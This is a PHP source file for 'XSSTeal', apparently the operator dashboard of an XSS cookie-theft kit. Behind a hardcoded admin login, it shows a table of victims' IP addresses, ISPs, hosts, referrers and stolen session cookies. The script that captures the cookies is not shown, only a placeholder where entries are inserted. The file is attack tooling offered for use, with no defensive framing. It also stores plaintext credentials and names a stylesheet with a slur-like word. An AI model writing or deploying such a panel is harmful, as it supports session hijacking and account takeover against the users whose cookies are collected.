<?php 
/*
XSSTEAL - BOUNTY
*/ 
?>
<?php

$LOGIN="admin";  //login
$PASSWD="viewer1";   //password
if ($_POST['logintext']==$LOGIN && $_POST['passwdtext']==$PASSWD) {  ?>
<html>
<link rel="stylesheet" href="css/gay.css">
<body>

<h1><span class="blue">&lt;</span>XSSTeal<span class="blue">&gt;</span></h1>
<h2>Created by Bounty</h2>

<table class="container">
  <thead>
<tr>
  <th>Country</th>
  <th>IP</th>
  <th>ISP</th>
  <th>Host</th>
  <th>Date</th>
  <th>Time</th>
  <th>Coming from</th>
  <th>Cookie</th>
    </tr>
  </thead>
  <tbody>
<!-- Breakpoint -->
  </tbody>
</table>

</body>
</html>


<?php
 } else 

 {
  ?>
<html >
<head>
  <script src="js/index.js"></script>
  <meta charset="UTF-8">
  <title>X S S T E A L</title>
  <link rel='stylesheet prefetch' href='http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css'>
      <link rel="stylesheet" href="css/style.css">
</head>
<body>
<form name="connexion" action="<?php echo ($_SERVER['PHP_SELF']); ?>" method="post">
  <div class="login-form">
     <h1>XSSteal  </h1>
     <div class="form-group ">
       <input name="logintext" type="text" class="form-control" placeholder="Username ">
       <i class="fa fa-user"></i>
     </div>
     <div class="form-group log-status">
       <input name="passwdtext" type="password" class="form-control" placeholder="Password">
       <i class="fa fa-lock"></i>
     </div>
     <input name="envoi" type="submit"  class="log-btn" value="Log In" />         
   </div>
</form>
  <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
</body>
</html>
<?php } ?>